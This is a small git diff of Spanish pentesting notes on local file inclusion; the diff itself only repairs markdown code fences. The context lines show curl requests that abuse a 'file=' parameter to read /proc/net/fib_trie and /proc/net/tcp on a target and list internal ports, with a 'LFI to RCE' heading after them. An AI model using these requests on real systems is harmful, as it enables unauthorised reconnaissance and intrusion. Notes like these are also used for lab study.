@@ -108,9 +108,9 @@ IP de la máquina
 curl -s 'http://domino/archivo.php?file=/proc/net/fib_trie'
 ```
 Puertos abiertos internos
-``
+```
 for port in $(curl -s 'http://domino/archivo.php?file=/proc/net/tcp' | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u); do echo "Puerto --> $(echo "ibase=16"; $port" | bc)"; done
-``
+```
 
 ### LFI to RCE 
 
